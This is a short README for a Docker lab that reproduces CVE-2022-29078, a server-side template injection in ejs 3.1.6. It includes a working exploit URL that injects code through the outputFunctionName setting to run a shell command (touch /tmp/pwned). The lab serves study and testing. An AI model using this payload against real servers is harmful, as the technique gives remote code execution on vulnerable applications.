# CVE-2022-29078
vuln ejs 3.1.6 docker

## Setup
```
git clone https://github.com/miko550/CVE-2022-29078.git  
cd CVE-2022-29078
docker build . -t miko/vuln-ejs
docker run -p 49160:8080 -d --name vuln-ejs miko/vuln-ejs
```
## Usage
```
http://127.0.0.1:49160/
```
## Exploit
### In browser
```
http://127.0.0.1:49160/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s
```
### Verify exploit
```
docker exec -it vuln-ejs /bin/bash
ls -la /tmp
```

# Reference
https://eslam.io/posts/ejs-server-side-template-injection-rce/
https://github.com/Olusamimaths/templating-with-ejs
